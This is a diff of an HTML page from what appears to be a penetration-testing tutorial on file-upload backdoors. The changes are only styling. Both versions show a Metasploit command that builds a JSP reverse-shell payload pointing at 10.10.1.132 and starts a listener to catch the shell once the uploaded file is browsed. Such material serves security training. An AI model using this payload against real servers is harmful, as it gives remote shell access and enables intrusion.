@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>File Upload Backdoors</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">File
 Upload Backdoors</h1>
@@ -18,7 +18,7 @@ File-Upload vulnerabilities can be tasty tricks for us to do.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">root@bt:/pentest/exploits/framework3# ./msfpayload java/jsp_shell_reverse_tcp LHOST=10.10.1.132 LPORT=8080 R &gt; shell.jsp &amp;&amp; ./msfcli exploit/multi/handler payload=java/jsp_shell_reverse_tcp LHOST=10.10.1.132 LPORT=8080 E<br>[*] Please wait while we load the module tree...<br>[*] Started reverse handler on port 8080<br>[*] Starting the payload handler...</pre>
+<pre id="code">root@bt:/pentest/exploits/framework3# ./msfpayload java/jsp_shell_reverse_tcp LHOST=10.10.1.132 LPORT=8080 R &gt; shell.jsp &amp;&amp; ./msfcli exploit/multi/handler payload=java/jsp_shell_reverse_tcp LHOST=10.10.1.132 LPORT=8080 E<br>[*] Please wait while we load the module tree...<br>[*] Started reverse handler on port 8080<br>[*] Starting the payload handler...</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Once our Java has been executed
 (i.e. by browsing to it) we should have a shell!
